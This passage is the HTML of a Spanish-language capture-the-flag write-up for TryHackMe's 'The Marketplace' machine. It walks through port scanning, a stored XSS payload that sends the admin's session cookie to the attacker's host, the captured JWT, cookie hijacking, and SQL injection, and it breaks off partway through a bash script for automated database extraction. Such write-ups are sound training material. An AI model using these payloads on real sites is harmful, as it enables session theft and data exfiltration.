@@ -1,0 +1,1052 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>The Marketplace - Try Hack Me - Invertebrado</title>
+<meta name="description" content="En esta máquina empezamos reconociendo una web con algunas publicaciones, pasando desde un XSS hasta obtener RCE">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Invertebrado">
+<meta property="og:title" content="The Marketplace - Try Hack Me">
+<meta property="og:url" content="http://localhost:4000/thm-the-marketplace/">
+
+
+  <meta property="og:description" content="En esta máquina empezamos reconociendo una web con algunas publicaciones, pasando desde un XSS hasta obtener RCE">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/thm-writeup-the-marketplace/TheMarketplace.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-08-17T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/thm-the-marketplace/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "Invertebrado",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Invertebrado Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">The Marketplace - Try Hack Me</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/trocado.png" alt="Invertebrado" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Invertebrado</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, HackTheBox, <br>TryHackMe, Red Team
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Colombia</span>
+        </li>
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="mailto:invertebr4do@gmail.com">
+            <meta itemprop="email" content="invertebr4do@gmail.com" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email
+          </a>
+        </li>
+      
+
+      
+        <li>
+          <a href="https://keybase.io/invertebrado" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fas fa-fw fa-key" aria-hidden="true"></i> Keybase
+          </a>
+        </li>
+      
+
+      
+        <li>
+          <a href="https://twitter.com/Invertebr4do" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/Invertebr4do" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="The Marketplace - Try Hack Me">
+    <meta itemprop="description" content="En esta máquina empezamos reconociendo una web con algunas publicaciones, pasando desde un XSS hasta obtener RCE">
+    <meta itemprop="datePublished" content="August 17, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">The Marketplace - Try Hack Me
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-08-17T00:00:00-05:00">August 17, 2021 </time>&emsp;
+          
+          
+        </p>
+        <p>Esta es una máquina de nivel medio según la plataforma</p>
+
+<p>Bien, lo primero que hacemos para empezar es lanzarle una traza ICMP a la máquina para verificar que se encuentra activa</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping <span class="nt">-c</span> 1 <span class="o">[</span>IP]
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PING 10.10.140.35 <span class="o">(</span>10.10.140.35<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.140.35: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>189 ms
+
+<span class="nt">---</span> 10.10.140.35 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 189.081/189.081/189.081/0.000 ms
+</code></pre></div></div>
+<p>Una vez comprobamos que la máquina se encuentra activa y en base al ttl reconocemos que el sistema operativo es linux continuamos haciendo un escaneo de puertos, para la resolución de máquinas yo acustumbro a usar nmap de la siguiente manera:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-sV</span> <span class="nt">-v</span> <span class="nt">-n</span> <span class="o">[</span>IP]
+</code></pre></div></div>
+<p>de esta manera se realizará un escaneo de todo el tango de puertos y se listarán solo los que tengan un estado abierto seguido del servicio que corre cada uno de ellos, dependiendo de la velocidad del escaneo puedes variarlo a tu gusto con el parametro -T o con –min-rate especificando el mínimo de paquetes que quieras que se emitan por segundo, ej: –min-rate 6000</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-17 16:03 <span class="nt">-05</span>
+NSE: Loaded 45 scripts <span class="k">for </span>scanning.
+Initiating Ping Scan at 16:03
+Scanning 10.10.140.35 <span class="o">[</span>4 ports]
+Completed Ping Scan at 16:03, 0.23s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+Initiating SYN Stealth Scan at 16:03
+Scanning 10.10.140.35 <span class="o">[</span>65535 ports]
+Discovered open port 80/tcp on 10.10.140.35
+Discovered open port 22/tcp on 10.10.140.35
+Discovered open port 32768/tcp on 10.10.140.35
+Completed SYN Stealth Scan at 16:05, 98.83s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Initiating Service scan at 16:05
+Scanning 3 services on 10.10.140.35
+Completed Service scan at 16:05, 11.97s elapsed <span class="o">(</span>3 services on 1 host<span class="o">)</span>
+NSE: Script scanning 10.10.140.35.
+Initiating NSE at 16:05
+Completed NSE at 16:05, 0.85s elapsed
+Initiating NSE at 16:05
+Completed NSE at 16:05, 0.78s elapsed
+Nmap scan report <span class="k">for </span>10.10.140.35
+Host is up <span class="o">(</span>0.23s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65532 filtered ports
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+80/tcp    open  http    nginx 1.19.2
+32768/tcp open  http    Node.js <span class="o">(</span>Express middleware<span class="o">)</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>113.33 seconds
+           Raw packets sent: 196680 <span class="o">(</span>8.654MB<span class="o">)</span> | Rcvd: 46 <span class="o">(</span>2.008KB<span class="o">)</span>
+</code></pre></div></div>
+<p>Podemos ver como se nos reportan 3 puertos abiertos externamente, el 22 (ssh), 80 (http) y el 32768 (http)</p>
+
+<p>Al no tener credenciales validas para intentar conectarnos por ssh vamos a efectuar un reconocimiento básico de la web con whatweb</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb http://[IP]
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.140.35 <span class="o">[</span>200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.19.2], IP[10.10.140.35],
+Title[The Marketplace], X-Powered-By[Express], nginx[1.19.2]
+</code></pre></div></div>
+<p>Así a simple vista no vemos nada de interes, como algún gestor de contenido o algún potencial usuario</p>
+
+<p>si efectuamos el mismo reconocimiento a la web por el puerto 32768, que es el otro puerto que vimos que corre un servicio http, tampoco vemos nada que nos llame la atención</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb http://[IP]:32768
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.140.35:32768 <span class="o">[</span>200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.140.35], Title[The Marketplace],
+X-Powered-By[Express]
+</code></pre></div></div>
+<p>así que vamos a analizar la web directamente desde el navegador</p>
+
+<p>Al abrirla podemos ver que hay algunas publicaciones hechas de algunos productos, justo debajo de ellas podemos ver los nombres de los usuarios que realizaron la publicación y adicionalmente podemos acceder a algunos apartados de la web como al inicio, el registro y el login</p>
+<p align="center">
+<img src="/assets/images/thm-writeup-the-marketplace/img1.png" />
+</p>
+<p>viendo las publicaciones no hay nada interesante, a demás de los potenciales usuarios que ya habíamos visto, así que me dirijo a la sección de registro que luce de la siguiente manera:</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-the-marketplace/img2.png" />
+</p>
+
+<p>nos registramos con un nombre de usuario cualquiera y una contraseña</p>
+
+<p>Una vez registrado y logeado vemos que tenemos disponibles nuevas secciones de la web, ahora podemos crear publicaciones y ver nuestros mensajes, a parte de poder reportar publicaciones al usuario administrador</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-the-marketplace/img3.png" />
+</p>
+
+<p>Si entramos en new listing vemos que aparte de poder poner un titulo y una descripción a la publicación que queremos crear, hay un botón que sirve para subir archivos a la web, pero está desactivado</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-the-marketplace/img4.png" />
+</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-the-marketplace/img5.png" />
+</p>
+
+<p>Este lo podemos activar desde las herramientas del navegador y dejarlo funcional para posteriormente subir una reverse shell, pero no vale la pena hacerlo porque no nos funcionará</p>
+
+<p>Entonces ya que podemos crear publicaciones con el contenido que queramos probé con XSS a ver si se interpretaba el código en la publicación</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-the-marketplace/img6.png" />
+</p>
+
+<p>y comprobamos que funcionó</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-the-marketplace/img7.png" />
+</p>
+
+<p>Ya sabiendo que es vulnerable y recordando que podemos reportar publicaciones al usuario administrador, pensé en que los tiros iban por un CSRF, así que creé una publicación con el siguiente contenido:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;img src='http://10.9.242.217/imagen.jpg?cookie=</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">'&gt;</span><span class="dl">"</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-the-marketplace/img8.png" />
+</p>
+
+<p>esto lo que hará es enviarme la cookie de sesión del usuario que abra la publicación por medio de una petición get a un recurso (imagen.jpg) a mi máquina de atacante, por lo tanto antes de hacer el reporte de la publicación debo iniciar un servidor http con python de la siguiente manera:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+<p>Reportamos la publicación</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-the-marketplace/img9.png" />
+</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-the-marketplace/img10.png" />
+</p>
+
+<p>y obtenemos la cookie del usuario administrador por consola</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span> python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.140.35 - - <span class="o">[</span>17/Aug/2021 16:56:43] code 404, message File not found
+10.10.140.35 - - <span class="o">[</span>17/Aug/2021 16:56:43] <span class="s2">"GET /imagen.jpg?cookie=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MjkyMzc0MDN9.eyoUCIc4jmxJpVs82X9FhkFR5WhZFDrG-pk1zS0oWcM HTTP/1.1"</span> 404 -
+</code></pre></div></div>
+
+<p>Una vez obtenida la cookie efectuamos un cookie hijacking, en mi caso, lo hago desde el apartado de almacenamiento de la página, pero tambien se puede hacer con herramientas como EditThisCookie</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-the-marketplace/img11.png" />
+</p>
+
+<p>Luego de esto, recargamos la página y vemos que se nos habilita una nueva sección de la web, el panel de administración</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-the-marketplace/img12.png" />
+</p>
+
+<p>Si seleccionamos algún usuario podemos ver un poco de información, pero lo más importante es que en la URL vemos algo que puede ser muy interesante</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-the-marketplace/img13.png" />
+</p>
+
+<p>Si probamos ingresando un valor erroneo en user=, como por ejemplo -1, podemos ver como se nos lista un error de sintaxis de mysql, lo que quiere decir que es vulnerable a sql-injection</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-the-marketplace/img14.png" />
+</p>
+
+<p>Hacemos un ordenamiento para determinar el número de columnas</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-the-marketplace/img15.png" />
+</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-the-marketplace/img16.png" />
+</p>
+
+<p>y ya sabiendo que son 4 podríamos ir listando tabla por tabla hasta encontrar algo que nos interese, pero eso podría llegar a ser algo tardado, así que lo que hice fue crear un pequeño script en bash que me automatice el proceso de listado de tablas, columnas y campos (Aquí abajo dejo el código)</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="c">#Colors</span>
+<span class="nv">greenColor</span><span class="o">=</span><span class="s2">"</span><span class="se">\e</span><span class="s2">[0;32m</span><span class="se">\0</span><span class="s2">33[1m"</span>
+<span class="nv">endColor</span><span class="o">=</span><span class="s2">"</span><span class="se">\0</span><span class="s2">33[0m</span><span class="se">\e</span><span class="s2">[0m"</span>
+<span class="nv">redColor</span><span class="o">=</span><span class="s2">"</span><span class="se">\e</span><span class="s2">[0;31m</span><span class="se">\0</span><span class="s2">33[1m"</span>
+<span class="nv">blueColor</span><span class="o">=</span><span class="s2">"</span><span class="se">\e</span><span class="s2">[0;34m</span><span class="se">\0</span><span class="s2">33[1m"</span>
+<span class="nv">yellowColor</span><span class="o">=</span><span class="s2">"</span><span class="se">\e</span><span class="s2">[0;33m</span><span class="se">\0</span><span class="s2">33[1m"</span>
+<span class="nv">purpleColor</span><span class="o">=</span><span class="s2">"</span><span class="se">\e</span><span class="s2">[0;35m</span><span class="se">\0</span><span class="s2">33[1m"</span>
+<span class="nv">turquoiseColor</span><span class="o">=</span><span class="s2">"</span><span class="se">\e</span><span class="s2">[0;36m</span><span class="se">\0</span><span class="s2">33[1m"</span>
+<span class="nv">grayColor</span><span class="o">=</span><span class="s2">"</span><span class="se">\e</span><span class="s2">[0;37m</span><span class="se">\0</span><span class="s2">33[1m"</span>
+
+<span class="k">function </span>ctrl_c<span class="o">(){</span>
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="k">${</span><span class="nv">redColor</span><span class="k">}</span><span class="s2">[!] Exiting...</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="se">\n</span><span class="s2">"</span>
+	tput cnorm<span class="p">;</span> <span class="nb">exit </span>1
+<span class="o">}</span>
+
+<span class="nb">trap </span>ctrl_c INT
+
+tput civis
+
+<span class="k">function </span>helpPanel<span class="o">(){</span>
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="k">${</span><span class="nv">redColor</span><span class="k">}</span><span class="s2">[!] Use: </span><span class="nv">$0</span><span class="s2">"</span>
+	<span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 80<span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="k">${</span><span class="nv">redColor</span><span class="k">}</span>-<span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="p">;</span> <span class="k">done
+	</span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n\t</span><span class="k">${</span><span class="nv">blueColor</span><span class="k">}</span><span class="s2">[-c]</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">Cookie</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2">"</span>
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="k">${</span><span class="nv">blueColor</span><span class="k">}</span><span class="s2">[-e]</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2"> Extract</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2">"</span>
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t\t</span><span class="k">${</span><span class="nv">purpleColor</span><span class="k">}</span><span class="s2">tables</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2">"</span>
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t\t</span><span class="k">${</span><span class="nv">purpleColor</span><span class="k">}</span><span class="s2">columns</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2">"</span>
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t\t\t</span><span class="k">${</span><span class="nv">blueColor</span><span class="k">}</span><span class="s2">[-t]</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">Table name</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2">"</span>
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t\t</span><span class="k">${</span><span class="nv">purpleColor</span><span class="k">}</span><span class="s2">fields</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2">"</span>
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t\t\t</span><span class="k">${</span><span class="nv">blueColor</span><span class="k">}</span><span class="s2">[-f]</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">Fields names</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">blueColor</span><span class="k">}</span><span class="s2"> (ceparate by </span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">purpleColor</span><span class="k">}</span><span class="s2">,</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">blueColor</span><span class="k">}</span><span class="s2">)</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2">"</span>
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="k">${</span><span class="nv">blueColor</span><span class="k">}</span><span class="s2">[-n]</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2"> Number output</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2">"</span>
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="k">${</span><span class="nv">blueColor</span><span class="k">}</span><span class="s2">[-h]</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2"> Show this help panel</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2">"</span>
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\t</span><span class="k">${</span><span class="nv">purpleColor</span><span class="k">}</span><span class="s2">Use examples:</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2">"</span>
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t\t</span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="nv">$0</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">blueColor</span><span class="k">}</span><span class="s2">-c</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiO</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">blueColor</span><span class="k">}</span><span class="s2">-e</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">tables</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">blueColor</span><span class="k">}</span><span class="s2">-n</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">80</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2">"</span>
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t\t</span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="nv">$0</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">blueColor</span><span class="k">}</span><span class="s2">-c</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiO</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">blueColor</span><span class="k">}</span><span class="s2">-e</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">columns</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">blueColor</span><span class="k">}</span><span class="s2">-t</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">Users</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">blueColor</span><span class="k">}</span><span class="s2">-n</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">30</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2">"</span>
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t\t</span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="nv">$0</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">blueColor</span><span class="k">}</span><span class="s2">-c</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiO</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">blueColor</span><span class="k">}</span><span class="s2">-e</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">fields</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">blueColor</span><span class="k">}</span><span class="s2">-f</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">id,user,password</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">blueColor</span><span class="k">}</span><span class="s2">-t</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">Users</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">blueColor</span><span class="k">}</span><span class="s2">-n</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">10</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="se">\n</span><span class="s2">"</span>
+
+	tput cnorm
+<span class="o">}</span>
+
+<span class="nb">declare</span> <span class="nt">-r</span> <span class="nv">url</span><span class="o">=</span><span class="s2">"http://127.0.0.1"</span> <span class="c"># &lt;- CHANGE THIS</span>
+
+<span class="k">function </span>extractTables<span class="o">(){</span>
+	<span class="nb">echo
